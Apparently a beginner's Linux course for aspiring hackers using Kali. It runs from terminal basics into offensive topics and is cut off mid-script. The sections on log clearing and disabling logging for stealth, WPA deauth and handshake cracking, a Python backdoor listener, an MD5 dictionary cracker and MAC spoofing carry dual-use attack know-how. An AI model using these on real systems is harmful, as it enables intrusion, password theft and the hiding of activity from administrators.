# Getting Started with Linux
Objectives

Understand why Linux is essential for cybersecurity and ethical hacking
 Install Kali Linux in VirtualBox (safe, isolated environment)
 Learn basic Linux terminal commands (pwd, whoami, ls, cd)
 Navigate the Linux filesystem structure
Lessons
1. Why Hackers Use Linux

🔹 Open-source → Full control over the OS.
🔹 Powerful CLI → Automate tasks, run hacking tools efficiently.
🔹 Pre-installed tools → Kali Linux comes with 500+ penetration testing tools.
🔹 Stability & Security → Less prone to malware than Windows.
2. Installing VirtualBox & Kali Linux
Step 1: Download VirtualBox

🔗 https://www.virtualbox.org/
Step 2: Download Kali Linux (Pre-built VM)

🔗 https://www.kali.org/get-kali/ → Choose "VirtualBox" version.
Step 3: Import Kali into VirtualBox

    Open VirtualBox → File → Import Appliance → Select downloaded .ova file.

    Start the VM → Login (kali / kali).

3. Linux Filesystem Overview
Directory | Purpose
____________________________________________________
/	      | Root directory (everything starts here)
/home	  | User personal files
/etc	  | System configuration files
/bin,     | /sbin	Essential command binaries
/var	  | Log files, databases
/usr	  | User programs & utilities
______________________________________________________
4. Basic Linux Commands
Command | Description	          | Example
__________________________________________________________
pwd	    | Print current directory | pwd → /home/kali
whoami	| Show current username	  | whoami → kali
ls	    | List files/folders	  | ls -l (detailed list)
cd	    | Change directory	      | cd /etc → Go to /etc
mkdir	| Create directory	      | mkdir HackFolder
cat	    | Display file content	  | cat /etc/passwd
__________________________________________________________

Activities
1. Set Up Kali Linux in a Virtual Machine

Task:

    Download & install VirtualBox.

    Import Kali Linux VM.

    Log in and update the system:
    bash

    sudo apt update && sudo apt upgrade -y

2. Explore the Linux Filesystem Using Terminal

Task:

    Open terminal (Ctrl + Alt + T).

    Run:
    bash

    pwd         # Check current location  
    ls          # List files  
    cd /etc     # Navigate to /etc  
    ls          # See config files  
    cat issue   # Display OS info  
    cd ~        # Return home  

# Text Manipulation in Linux
**Objectives**

  Master command-line text processing tools (head, tail, grep, sed, less)
  Learn to search, filter, and modify text files efficiently
  Complete a Hacker Challenge to apply skills

**Lessons**
1. Viewing Files (head, tail, nl)
Command	| Description	                   | Example
_______________________________________________________________________
head	   | Show first 10 lines of a file  | head /var/log/syslog
tail	   | Show last 10 lines of a file	  | tail -n 20 /var/log/auth.log
nl	     | Display file with line numbers	| nl /etc/passwd
________________________________________________________________________

🔹 Bonus:

    tail -f → Live tracking (great for logs).

    head -n 5 → Show first 5 lines.

2. Searching with grep

grep searches for patterns in files.
Flag | Effect	                  | Example
___________________________________________________________________
-i	  | Case-insensitive search  | grep -i "error" /var/log/syslog
-v	  | Invert match (exclude)	  | grep -v "192.168.1.1" access.log
-r	  | Recursive search	        | grep -r "password" /etc/
-A 2 | Show 2 lines after match	| grep -A 2 "failed" auth.log
____________________________________________________________________

🔹 Advanced:
```bash

grep -E "^(root|admin)" /etc/passwd  # Regex search
```
3. Replacing Text with sed

sed edits text without opening files (stream editor).
Command	                   | Effect
________________________________________________________________
sed 's/old/new/' file.txt  | Replace first occurrence per line
sed 's/old/new/g' file.txt | Replace all occurrences
sed '/pattern/d' file.txt  | Delete lines matching pattern
_________________________________________________________________

🔹 Example:
```bash

sed 's/foo/bar/g' example.txt  # Replace "foo" with "bar" globally
```
4. Navigation with more and less
Tool | Description	                      | Commands
____________________________________________________________________
more | Basic file viewer (forward-only)	  | space=next page, q=quit
less | Advanced viewer (scroll both ways) | ↑/↓=scroll, /=search
_____________________________________________________________________

🔹 Why less > more?

    Supports backward scrolling.

    Search with /pattern.

Activities
1. Hacker Challenge: Log Analysis

Scenario:
You found a server log (access.log). Extract:

    All failed login attempts (grep).

    The last 5 lines (tail).

    Replace all instances of 192.168.1.100 with HACKED (sed).

Solution:
bash

# 1. Find failed logins
grep "failed" access.log

# 2. Get last 5 lines
tail -n 5 access.log

# 3. Replace IP with "HACKED"
sed 's/192.168.1.100/HACKED/g' access.log > modified.log


# Analyzing and Managing Networks
Objectives

 Use network tools (ifconfig, ip, iwconfig) to analyze and modify network settings
 Understand IP addressing, DNS lookups, and MAC spoofing
 Assign a new IP address and spoof a MAC address
Lessons
1. Network Interface Tools
ifconfig (Legacy) vs. ip (Modern)
Command	 | Description                   | Example
_________________________________________________________
ifconfig | View/set network interfaces   | ifconfig eth0
ip	      | More powerful replacement     | ip addr show
iwconfig | Configure wireless interfaces | iwconfig wlan0
__________________________________________________________

🔹 Key Uses:

    Check IP, MAC, and interface status.

    Enable/disable interfaces (sudo ifconfig eth0 up/down).

2. DNS Tools (dig, nslookup)
Command	 | Description          | Example
_______________________________________________________
dig	     | Advanced DNS queries | dig google.com
nslookup | Simple DNS lookups	  | nslookup example.com
_______________________________________________________

🔹 Find DNS Records:
bash

dig google.com MX      # Get mail servers  
nslookup -type=AAAA google.com  # IPv6 lookup  

3. Changing IP and MAC Addresses
Temporarily Change IP
bash

sudo ifconfig eth0 192.168.1.100 netmask 255.255.255.0

or (modern ip command):
bash

sudo ip addr add 192.168.1.100/24 dev eth0

Spoof MAC Address

    Disable interface:
    bash

sudo ifconfig eth0 down

Change MAC:
bash

sudo ifconfig eth0 hw ether 00:11:22:33:44:55

Re-enable:
bash

    sudo ifconfig eth0 up

🔹 Verify:
bash

ifconfig eth0 | grep ether

Activities
1. Assign a New IP Address

Task:

    Check current IP:
    bash

ip addr show eth0

Assign a new IP (e.g., 192.168.1.150):
bash

sudo ip addr add 192.168.1.150/24 dev eth0

Verify:
bash

    ping 192.168.1.150

2. Spoof Your MAC Address

Task:

    Find your current MAC:
    bash

ifconfig eth0 | grep ether

Change it to 00:12:34:56:78:90:
bash

sudo ifconfig eth0 down  
sudo ifconfig eth0 hw ether 00:12:34:56:78:90  
sudo ifconfig eth0 up  

Verify:
bash

    ifconfig eth0 | grep ether


# Managing Software in Kali Linux
Objectives

  Master package management with apt
  Learn to add software repositories
  Install tools from GitHub and GUI installers
  Set up essential hacking tools
  
**Lessons**
1. Using apt for Package Management
apt (Advanced Package Tool) is Kali’s default package manager.
Command	    | Description	             | Example
_________________________________________________________________________________
apt update	| Update package lists       | sudo apt update
apt upgrade	| Upgrade installed packages | sudo apt upgrade -y
apt install	| Install a package	         | sudo apt install nmap
apt remove	| Uninstall a package	     | sudo apt remove metasploit-framework
apt search	| Search for packages	     | apt search "password crack"
apt show	| View package details	     | apt show wireshark
_________________________________________________________________________________

🔹 Pro Tip:

    Use sudo apt autoremove to clean up unused dependencies.

2. Adding Software Repositories

Sometimes tools aren’t in Kali’s default repos.
Adding a Repo

    Edit /etc/apt/sources.list:
    bash

sudo nano /etc/apt/sources.list

Add a new line (e.g., for Google Chrome):
text

deb http://dl.google.com/linux/chrome/deb/ stable main

Add the repo’s GPG key:
bash

wget https://dl.google.com/linux/linux_signing_key.pub
sudo apt-key add linux_signing_key.pub

Update & install:
bash

    sudo apt update && sudo apt install google-chrome-stable

3. Installing from Git and GUIs
Git Installations (Manual Compilation)

    Clone the repo:
    bash

git clone https://github.com/toolname/tool.git

Install dependencies:
bash

sudo apt install build-essential libssl-dev

Compile & install:
bash

    cd tool  
    ./configure  
    make  
    sudo make install  

GUI Installers (.deb, .run)

    .deb files (like Chrome):
    bash

sudo dpkg -i package.deb

.run or .sh files:
bash

    chmod +x installer.sh  
    ./installer.sh  

Activities
1. Install Key Hacking Tools

✅ Task: Install the following using different methods:
Method 1: apt (Default Repo)
bash

sudo apt install hydra sqlmap john

Method 2: Git (Manual Compilation)
bash

git clone https://github.com/trustedsec/social-engineer-toolkit.git  
cd social-engineer-toolkit  
sudo python3 setup.py install

Method 3: .deb Package (GUI Installer)
bash

wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb  
sudo dpkg -i google-chrome-stable_current_amd64.deb

# File and Directory Permissions
Objectives

✔ Understand Linux file permissions (chmod, chown)
✔ Learn about users, groups, and ownership
✔ Master special permissions (SUID, SGID, Sticky Bit)
✔ Secure a script with custom permissions
Lessons
1. Users and Groups
Command	     | Description	            | Example
___________________________________________________________________
whoami	     | Show current user	    | whoami
groups	     | List user’s groups	    | groups kali
id	         | Display user & group IDs | id
sudo adduser | Create a new user	    | sudo adduser bob
sudo usermod | Modify user groups	    | sudo usermod -aG sudo bob
____________________________________________________________________

Key Files:

    /etc/passwd → User accounts

    /etc/group → Group definitions

    /etc/shadow → Encrypted passwords

2. Changing Ownership & Permissions
chown (Change Owner)
bash

sudo chown user:group file.txt  # Change owner & group  
sudo chown bob script.sh       # Change owner only  

chmod (Change Permissions)

Permissions are set for:

    User (u)

    Group (g)

    Others (o)

Permission | Symbol	 | Number
______________________________
Read	   | r	     | 4
Write	   | w	     | 2
Execute	   | x	     | 1
______________________________

Examples:
bash

chmod u+x script.sh      # Give user execute permission  
chmod 755 script.sh      # rwxr-xr-x (User: 7, Group/Others: 5)  
chmod -R 644 /var/www/   # Recursively set permissions  

3. Special Permissions
Permission	       | Symbol	| Number |	Effect
______________________________________________________________
SUID (Set User ID) | s	    | 4	     | Runs as file owner (e.g., passwd)
SGID (Set Group ID)| s	    | 2	     | Runs as file group
Sticky Bit	       | t	    | 1	     | Only owner can delete (e.g., /tmp)
_______________________________________________________________
🔹 Examples:
bash

chmod u+s /usr/bin/script  # SUID  
chmod g+s /shared/         # SGID  
chmod +t /tmp              # Sticky Bit  

Activities
1. Configure Permissions on a Script

Task:

    Create a script:
    bash

    echo 'echo "Hello, World!"' > hello.sh

    Set permissions so:

        Owner (you) can read, write, execute.

        Group can read & execute.

        Others can only read.

Solution:
bash

chmod 754 hello.sh  # rwxr-xr--

Verify:
bash

ls -l hello.sh  # Should show -rwxr-xr--

# Process Management
Objectives

✔ Monitor running processes (ps, top, htop)
✔ Control process priority (nice, renice)
✔ Kill unresponsive or malicious processes (kill, pkill)
✔ Manage background jobs (&, jobs, fg, bg)
Lessons
1. Viewing Processes
Command	| Description	                                    | Example
______________________________________________________________________
ps	    | List processes	                                | ps aux
top	    | Interactive process viewer 	                    | top
htop	| Enhanced top (install with sudo apt install htop)	| htop
______________________________________________________________________

🔹 Key Columns in ps aux:

    USER → Process owner

    PID → Process ID

    %CPU → CPU usage

    %MEM → Memory usage

    COMMAND → Running command

2. Managing Process Priority
Command	| Description	                                   | Example
_________________________________________________________________________________
nice	| Start process with adjusted priority (-20 to 19) | nice -n 10 command
renice	| Change priority of running process	           | renice -n 5 -p 1234
__________________________________________________________________________________

🔹 Priority Rules:

    Lower nice value = Higher priority (-20 = highest, 19 = lowest)

    Root can set negative values, users can only increase niceness

3. Killing Processes
Command | Description	       | Example
________________________________________________
kill	| Terminate by PID	   | kill 1234
kill -9	| Force kill (SIGKILL) | kill -9 1234
pkill	| Kill by name	       | pkill firefox
killall	| Kill all instances   | killall chrome
________________________________________________

🔹 Common Signals:

    SIGTERM (15) → Graceful termination (default)

    SIGKILL (9) → Force kill (use as last resort)

4. Background Jobs
Command	| Description	       | Example
________________________________________________________
&	    | Run in background	   | python3 script.py &
jobs	| List background jobs | jobs
fg	    | Bring to foreground  | fg %1
bg	    | Resume in background | bg %1
Ctrl+Z	| Suspend current job  | (Press keys)
_______________________________________________________
Activities
1. Identify & Terminate High-Resource Processes

✅ Task:

    Find the top 3 CPU-consuming processes:
    bash

ps aux --sort=-%cpu | head -n 4

Kill the most resource-heavy process:
bash

kill [PID]

If it doesn’t respond, force kill:
bash

    kill -9 [PID]

Alternative: Use htop → Highlight process → Press F9 → Select SIGKILL.


# Environment Variables
Objectives

✔ View and modify environment variables (env, export)
✔ Customize your shell via .bashrc and .profile
✔ Modify the PATH and PS1 prompt
✔ Create persistent custom variables
Lessons
1. Viewing & Changing Environment Variables
Command	  | Description                    | Example
___________________________________________________________________
env	      | List all environment variables | env
echo $VAR |	Print a specific variable	   | echo $PATH
export	  | Set a temporary variable	   | export MY_VAR="Hello"
unset	  | Remove a variable	           | unset MY_VAR
_____________________________________________________________________
🔹 Common Variables:

    PATH → Directories for executable files

    HOME → User’s home directory

    USER → Current username

    PS1 → Shell prompt format

2. Updating .bashrc and .profile

These files run when you start a new shell session:
File	   | When It Runs	             | Use Case
~/.bashrc  | Every new interactive shell | Aliases, prompt changes
~/.profile | (or ~/.bash_profile)	     | Login shells	Environment variables, startup programs

🔹 Apply Changes Without Relogin:
bash

source ~/.bashrc  # Reload .bashrc

3. Modifying PATH and PS1
Add a Directory to PATH
bash

export PATH=$PATH:/my/custom/dir  # Temporary  
echo 'export PATH=$PATH:/my/custom/dir' >> ~/.bashrc  # Permanent  

Customize PS1 (Shell Prompt)
bash

export PS1="\u@\h:\w\$ "  # User@Host:Dir$  

🔹 Common PS1 Symbols:

    \u → Username

    \h → Hostname

    \w → Current directory

    \$ → # if root, $ if user

Activities
1. Create and Persist a Custom Environment Variable

Task:

    Set a temporary variable:
    bash

export SECRET_KEY="12345"

Verify it exists:
bash

echo $SECRET_KEY

Make it persist (add to ~/.bashrc):
bash

echo 'export SECRET_KEY="12345"' >> ~/.bashrc

Reload .bashrc:
bash

    source ~/.bashrc

Bonus: Hide the variable from env for stealth:
bash

export SECRET_KEY="12345" 2>/dev/null

# Bash Scripting for Hackers
Objectives

✔ Write and execute Bash scripts for automation
✔ Use variables, loops, and conditionals
✔ Build a network scanner in Bash
✔ Learn essential built-in commands
Lessons
1. Script Basics
Create & Run a Script

    Write the script (nano scan.sh):
    bash

#!/bin/bash
echo "Running network scan..."

Make it executable:
bash

chmod +x scan.sh

Run it:
bash

    ./scan.sh

Variables & User Input
bash

#!/bin/bash
TARGET="192.168.1.1"
read -p "Enter IP: " TARGET  # Prompt user
echo "Scanning $TARGET..."

2. Writing a Port Scanner

A simple TCP port scanner in Bash:
bash

#!/bin/bash

TARGET="192.168.1.1"
PORTS="22 80 443"  # Common ports

for PORT in $PORTS; do
  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null &&
    echo "Port $PORT is OPEN" ||
    echo "Port $PORT is CLOSED"
done

🔹 How It Works:

    Uses /dev/tcp for TCP checks (no nmap needed).

    timeout 1 → Waits 1 second per port.

    2>/dev/null → Hides errors.

3. Built-in Bash Commands
Command	    | Description	   | Example
____________________________________________________________
echo	    | Print text	   | echo "Hello"
read	    | Get user input   | read -p "Enter IP: " IP
test / [ ]	| Condition checks | if [ $PORT -eq 80 ]; then
for / while | Loops	           | for IP in {1..10}; do
if / else	| Conditionals	   | if ping -c 1 $IP; then
_____________________________________________________________
Activities
1. Build a Functional Network Scanner

Task:

    Create scanner.sh:
    bash

#!/bin/bash
echo "Network Scanner"
read -p "Enter IP range (e.g., 192.168.1.1-10): " RANGE

START=$(echo $RANGE | cut -d '-' -f1 | cut -d '.' -f4)
END=$(echo $RANGE | cut -d '-' -f2)
BASE=$(echo $RANGE | cut -d '.' -f1-3)

for IP in $(seq $START $END); do
  ping -c 1 $BASE.$IP | grep "bytes from" | cut -d " " -f4 | tr -d ":"
done

Make it executable:
bash

chmod +x scanner.sh

Run it:
bash

    ./scanner.sh

What It Does:

    Scans an IP range (e.g., 192.168.1.1-10).

    Pings each IP and lists active hosts.

# Compression and Archiving
Objectives

 Master tar, gzip, bzip2 for file compression
 Create backups & forensic disk images
 Archive and restore directories
Lessons
1. Compression Tools
Tool	Command	Best For
gzip	gzip file.txt → file.txt.gz	Fast compression
bzip2	bzip2 file.txt → file.txt.bz2	Better compression (slower)
xz	xz file.txt → file.txt.xz	High compression (slowest)

Decompression:
bash

gunzip file.txt.gz      # gzip  
bunzip2 file.txt.bz2    # bzip2  
unxz file.txt.xz        # xz  

2. Archiving with tar

tar bundles files into a single archive (.tar).
Command	Description
tar -cvf archive.tar /dir	Create archive (-create, -verbose, -file)
tar -xvf archive.tar	Extract archive (-xtract)
tar -tvf archive.tar	List contents (-test)

🔹 Compressed Archives:
bash

tar -czvf backup.tar.gz /dir    # gzip  
tar -cjvf backup.tar.bz2 /dir   # bzip2  
tar -cJvf backup.tar.xz /dir    # xz  

3. Creating Forensic Images

Use dd for bit-for-bit copies (e.g., USB drives):
bash

sudo dd if=/dev/sdb of=backup.img bs=4M status=progress  

    if = Input file (e.g., /dev/sdb)

    of = Output file (e.g., backup.img)

    bs = Block size (faster with larger values)

Activities
1. Archive & Restore a Directory

Task:

    Compress /home/kali/Documents:
    bash

tar -czvf docs_backup.tar.gz /home/kali/Documents

List contents:
bash

tar -tvf docs_backup.tar.gz

Restore to /tmp:
bash

    tar -xzvf docs_backup.tar.gz -C /tmp

Verify:
bash

ls /tmp/home/kali/Documents

# Filesystem and Storage Management
Objectives

Navigate Linux device files (/dev)
Use lsblk, fdisk, and mount
Check disk usage (df, du) and health (smartctl)
Mount and explore USB drives
Lessons
1. Navigating /dev and Listing Devices
Command  | Description	                          | Example
lsblk	 | List block devices (disks, partitions) |	lsblk -f
fdisk -l | Show partition tables	              | sudo fdisk -l
blkid	 | List UUIDs of partitions	              | sudo blkid

🔹 Key Locations:

    /dev/sda → First disk

    /dev/sda1 → First partition on sda

    /dev/sdb → Second disk (e.g., USB)

2. Mounting and Unmounting Drives
Mount a Filesystem
bash

sudo mkdir /mnt/usb                          # Create mount point  
sudo mount /dev/sdb1 /mnt/usb                 # Mount partition  

Unmount Safely
bash

sudo umount /mnt/usb                          # Note: Not "unmount"  

🔹 Auto-Mount at Boot:
Edit /etc/fstab:
text

UUID=1234-5678 /mnt/usb ext4 defaults 0 2  

3. Checking Disk Usage and Health
Command	Description
df -h	Show free space (-h = human-readable)
du -sh /dir	Check directory size
smartctl -a /dev/sda	Check disk health (requires smartmontools)
Activities
1. Mount a USB Device and View Contents

✅ Task:

    Insert USB → Identify it:
    bash

lsblk  
# Look for /dev/sdb1 or similar  

Mount it:
bash

sudo mkdir /mnt/usb  
sudo mount /dev/sdb1 /mnt/usb  

View files:
bash

ls -l /mnt/usb  

Unmount:
bash

sudo umount /mnt/usb  

# Logging and Stealth
Objectives

Understand Linux logging systems (rsyslog, journald)
Learn log rotation (logrotate)
Discover stealth techniques (disabling/clearing logs)
Practice log review and manipulation
Lessons
1. Linux Logging Systems
Key Log Files
Log File	                | Purpose
________________________________________________________
/var/log/auth.log	        | Authentication (SSH, sudo)
/var/log/syslog	            | General system activity
/var/log/kern.log	        | Kernel messages
/var/log/apache2/access.log	| Apache web server access
________________________________________________________
Log Management Tools
Tool	   | Description
___________________________________________________
rsyslog	   | Primary logging daemon
journalctl | View systemd logs (journalctl -u ssh)
logrotate  | Automatically rotates/compresses logs
_____________________________________________________
2. Disabling & Clearing Logs
Temporarily Disable Logging
bash

# Stop rsyslog  
sudo systemctl stop rsyslog  

# Stop journald (systemd)  
sudo systemctl stop systemd-journald  

Clear Logs (Stealth)
bash

# Clear auth.log (but leaves traces)  
sudo echo "" > /var/log/auth.log  

# "Secure" deletion (shred + truncate)  
sudo shred -zu /var/log/auth.log  
sudo touch /var/log/auth.log  

Disable Specific Logging

Edit /etc/rsyslog.conf and comment out lines:
text

# auth.* /var/log/auth.log  

Then restart:
bash

sudo systemctl restart rsyslog  

3. Logrotate (Automated Log Management)

Config file: /etc/logrotate.conf

Example for /var/log/hacking.log:
text

/var/log/hacking.log {  
  daily  
  rotate 7  
  compress  
  missingok  
  notifempty  
}  

Apply manually:
bash

sudo logrotate -f /etc/logrotate.conf  

Activities
1. Review and Disable Specific Logs

Task:

    Check SSH logs:
    bash

sudo cat /var/log/auth.log | grep sshd  

Disable SSH logging:
bash

sudo nano /etc/rsyslog.d/50-default.conf  

Find and comment:
text

# auth.*,authpriv.* /var/log/auth.log  

Restart logging:
bash

sudo systemctl restart rsyslog  

Verify:
bash

    sudo tail -f /var/log/auth.log  # Should show no new SSH entries  

# Using and Abusing Services
Objectives

✔ Manage Linux services with systemctl
✔ Set up an Apache web server
✔ Configure SSH for remote access
✔ Interact with MySQL databases
Lessons
1. Managing Services with systemctl
Command	                       | Description
__________________________________________________
sudo systemctl start apache2   | Start a service
sudo systemctl stop apache2	   | Stop a service
sudo systemctl restart apache2 | Restart a service
sudo systemctl enable apache2  | Start at boot
sudo systemctl disable apache2 | Disable at boot
sudo systemctl status apache2  | Check status
____________________________________________________

🔹 Key Services:

    apache2 → Web server

    ssh → Remote access

    mysql → Database

2. Apache Web Server Setup
Install & Run Apache
bash

sudo apt install apache2  
sudo systemctl start apache2  

Test Apache

Visit:

http://localhost  

Or check with:
bash

curl http://localhost  

Host a Simple Web Page
bash

echo "Hacked by $(whoami)" | sudo tee /var/www/html/index.html  

3. Remote Access with SSH
Enable SSH Server
bash

sudo apt install openssh-server  
sudo systemctl start ssh  

Connect Remotely
bash

ssh username@ip-address  

Harden SSH (Security)

Edit /etc/ssh/sshd_config:
text

PermitRootLogin no  
PasswordAuthentication no  # Use SSH keys  

Then restart:
bash

sudo systemctl restart ssh  

4. MySQL Database Access
Install & Secure MySQL
bash

sudo apt install mysql-server  
sudo mysql_secure_installation  

Login & Basic Commands
bash

sudo mysql -u root -p  

sql

SHOW DATABASES;  
CREATE DATABASE test;  
USE test;  
CREATE TABLE users (id INT, name VARCHAR(20));  

Activities
1. Set Up and Monitor an Apache Server

✅ Task:

    Install Apache:
    bash

sudo apt install apache2  

Start & enable it:
bash

sudo systemctl start apache2  
sudo systemctl enable apache2  

Monitor access logs:
bash

sudo tail -f /var/log/apache2/access.log  

Test from another machine:
bash

    curl http://your-server-ip  


# Security and Anonymity
Objectives

✔ Use Tor and proxy chains for anonymity
✔ Set up a VPN for encrypted traffic
✔ Configure encrypted email (PGP/GPG)
✔ Browse the web without leaving traces
Lessons
1. Tor & Proxy Servers
Tor (The Onion Router)

    Routes traffic through multiple nodes for anonymity.

Install & Run Tor:
bash

sudo apt install tor  
sudo systemctl start tor  

Use torsocks for Anonymity:
bash

torsocks curl https://check.torproject.org  # Verify Tor exit IP  

ProxyChains (Route Traffic Through Proxies)

    Install:
    bash

sudo apt install proxychains  

Edit /etc/proxychains.conf:
text

socks5 127.0.0.1 9050  # Tor proxy  
# or add other proxies: http 1.2.3.4 8080  

Run apps through ProxyChains:
bash

    proxychains nmap -sT target.com  

2. VPN Basics

    Encrypts all traffic and masks your IP.

Using OpenVPN (Example):
bash

sudo apt install openvpn  
sudo openvpn --config client.ovpn  # Connect to VPN provider  

🔹 Recommended VPNs:

    ProtonVPN (Free tier available)

    Mullvad (No logs, anonymous accounts)

3. Encrypted Email (PGP/GPG)
Install GPG
bash

sudo apt install gnupg  

Generate a Key Pair
bash

gpg --full-generate-key  # Follow prompts (RSA, 4096-bit recommended)  

Encrypt/Decrypt Emails
bash

gpg --encrypt --recipient "user@example.com" message.txt  
gpg --decrypt message.txt.gpg  

🔹 Use with Thunderbird:

    Install Enigmail add-on for PGP in emails.

Activities
1. Configure Proxy Settings & Browse Anonymously

✅ Task:

    Install Tor & Privoxy (HTTP-to-SOCKS proxy):
    bash

    sudo apt install tor privoxy  

    Configure Firefox for Tor:

        Go to about:preferences → Network Settings

        Set Manual Proxy:

            SOCKS Host: 127.0.0.1, Port: 9050

            Check "Proxy DNS when using SOCKS"

    Verify Anonymity:

        Visit https://check.torproject.org

        Check IP at https://whatismyipaddress.com

🔹 Alternative: Use the Tor Browser for full anonymity.


# Wireless Networks
Objectives

✔ Discover and analyze Wi-Fi networks
✔ Use aircrack-ng for WPA/WPA2 cracking
✔ Perform Bluetooth reconnaissance
✔ Capture a WPA handshake for offline cracking
Lessons
1. Wi-Fi Scanning & Cracking (aircrack-ng)
Step 1: Enable Monitor Mode
bash

sudo airmon-ng check kill   # Kill interfering processes  
sudo airmon-ng start wlan0  # Enable monitor mode (creates wlan0mon)  

Step 2: Scan for Networks
bash

sudo airodump-ng wlan0mon  

    Lists BSSID (MAC), channel, encryption type (WEP/WPA/WPA2).

Step 3: Capture Handshake
bash

sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon  

    -c 6 → Channel

    --bssid → Target router MAC

    -w capture → Save to file

Step 4: Force Handshake (Deauth Attack)
bash

sudo aireplay-ng -0 4 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon  

    -0 4 → Send 4 deauth packets

    -a → AP MAC

    -c → Client MAC

Step 5: Crack Handshake
bash

sudo aircrack-ng -w rockyou.txt capture-01.cap  

    Uses wordlist (rockyou.txt) to crack the password.

2. Bluetooth Reconnaissance
Scan for Devices
bash

sudo hcitool scan  

Deeper Scan (L2Ping)
bash

sudo l2ping -c 4 AA:BB:CC:DD:EE:FF  

Bluetooth Sniffing (Ubertooth)
bash

ubertooth-btle -f -r capture.pcap  

Activities
1. Capture a WPA Handshake

✅ Task:

    Put your Wi-Fi card in monitor mode:
    bash

sudo airmon-ng start wlan0  

Scan for networks:
bash

sudo airodump-ng wlan0mon  

Target a network and capture handshake:
bash

sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon  

Force a handshake (deauth attack):
bash

sudo aireplay-ng -0 4 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon  

Verify capture:

    Look for "WPA handshake" in airodump-ng output.

#  Linux Kernel and Modules
Objectives

✔ Explore Linux kernel modules (lsmod, modprobe)
✔ Tune kernel parameters (sysctl)
✔ Load and unload modules dynamically
✔ Disable a kernel module for security
Lessons
1. Kernel Modules Basics
List Loaded Modules
bash

lsmod  # Shows currently loaded modules  

Module Information
bash

modinfo <module_name>  # e.g., `modinfo e1000`  

Load/Unload Modules
bash

sudo modprobe <module_name>      # Load  
sudo modprobe -r <module_name>   # Unload  

🔹 Manual Loading (Avoid Unless Necessary):
bash

sudo insmod /path/to/module.ko   # Load  
sudo rmmod <module_name>         # Unload  

2. Kernel Tuning with sysctl
View Current Settings
bash

sysctl -a  # List all parameters  

Change Parameters Temporarily
bash

sudo sysctl -w kernel.your.parameter=value  

Make Changes Permanent

Edit /etc/sysctl.conf and add:
text

kernel.your.parameter = value  

Then apply:
bash

sudo sysctl -p  

🔹 Example (Disable ICMP Ping):
bash

sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1  

3. Blacklisting Modules

Prevent a module from loading at boot:

    Edit /etc/modprobe.d/blacklist.conf:
    text

blacklist <module_name>  

Update initramfs:
bash

    sudo update-initramfs -u  

Activities
1. Disable a Kernel Module

✅ Task:

    Identify a non-critical module (e.g., floppy):
    bash

lsmod | grep floppy  

Unload it:
bash

sudo modprobe -r floppy  

Blacklist it permanently:
bash

echo "blacklist floppy" | sudo tee -a /etc/modprobe.d/blacklist.conf  
sudo update-initramfs -u  

Reboot and verify:
bash

lsmod | grep floppy  # Should show nothing  

# Automating Tasks
Objectives

✔ Automate tasks using cron
✔ Schedule scripts with crontab
✔ Configure startup jobs (rc.local, systemd)
Lessons
1. Cron Jobs (crontab)
Edit User's Crontab
bash

crontab -e  # Opens the cron file in default editor  

Cron Syntax
text

* * * * * /path/to/command  
│ │ │ │ │  
│ │ │ │ └── Day of week (0-7, 0=Sunday)  
│ │ │ └──── Month (1-12)  
│ │ └────── Day of month (1-31)  
│ └──────── Hour (0-23)  
└────────── Minute (0-59)  

Examples
Schedule	| Command	           | Purpose
__________________________________________________________
0 3 * * *   | /backup.sh	       | Daily backup at 3 AM
*/5 * * * *	| ping -c 1 google.com | Ping every 5 mins
@reboot	    | /startup.sh	       | Run at system boot
___________________________________________________________

🔹 View Active Cron Jobs:
bash

crontab -l  

2. Startup Jobs (rc.local & systemd)
Legacy: /etc/rc.local

    Edit the file:
    bash

sudo nano /etc/rc.local  

Add commands before exit 0:
bash

/home/user/startup.sh &  

Make it executable:
bash

    sudo chmod +x /etc/rc.local  

Modern: systemd Service

    Create a service file:
    bash

sudo nano /etc/systemd/system/myscript.service  

Add:
text

[Unit]  
Description=My Startup Script  

[Service]  
ExecStart=/home/user/startup.sh  

[Install]  
WantedBy=multi-user.target  

Enable & start:
bash

    sudo systemctl enable myscript  
    sudo systemctl start myscript  

Activities
1. Schedule a Script to Run Daily

✅ Task:

    Create a script (/home/user/daily_task.sh):
    bash

#!/bin/bash  
echo "Daily task run at $(date)" >> /home/user/cron_log.txt  

Make it executable:
bash

chmod +x /home/user/daily_task.sh  

Schedule it to run every day at 2 AM:
bash

crontab -e  

Add:
text

    0 2 * * * /home/user/daily_task.sh  

🔹 Verify:
bash

tail -f /home/user/cron_log.txt  # Check after 2 AM  

# Python Scripting for Hackers
Objectives

✔ Learn Python basics for security automation
✔ Build TCP clients/servers for networking tasks
✔ Create a password cracker (dictionary attack)
✔ Write a port scanner with banner grabbing
Lessons
1. Python Basics
Variables & Loops
```python

# Variables  
target = "192.168.1.1"  

# Loops  
for port in range(1, 100):  
    print(f"Scanning port {port}")  

Functions


def scan_port(ip, port):  
    try:  
        sock = socket.socket()  
        sock.connect((ip, port))  
        print(f"[+] Port {port} open")  
    except:  
        pass  
```
2. Networking (TCP Clients & Listeners)

- TCP Client (Port Scanner)

```python

import socket  

target = "192.168.1.1"  

for port in range(1, 100):  
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.settimeout(1)  
    result = sock.connect_ex((target, port))  
    if result == 0:  
        print(f"Port {port} is open")  
    sock.close()  
```
- TCP Listener (Backdoor Shell)

```python

import socket  

s = socket.socket()  
s.bind(("0.0.0.0", 4444))  
s.listen(1)  
print("Listening...")  

conn, addr = s.accept()  
print(f"Connected to {addr}")  

while True:  
    cmd = input("$ ")  
    conn.send(cmd.encode())  
    print(conn.recv(1024).decode())  

3. Password Cracker (Dictionary Attack)
```
```python

import hashlib  

def crack_hash(hash, wordlist):  
    with open(wordlist, "r") as f:  
        for word in f:  
            word = word.strip()  
            guess = hashlib.md5(word.encode()).hexdigest()  
            if guess == hash:  
                return f"Password found: {word}"  
    return "Password not found"  

print(crack_hash("5f4dcc3b5aa765d61d8327deb882cf99", "rockyou.txt"))  
```
Activities
1. Write a Port Scanner with Banner Grabbing

Task:

    Create port_scanner.py:

```python

import socket  

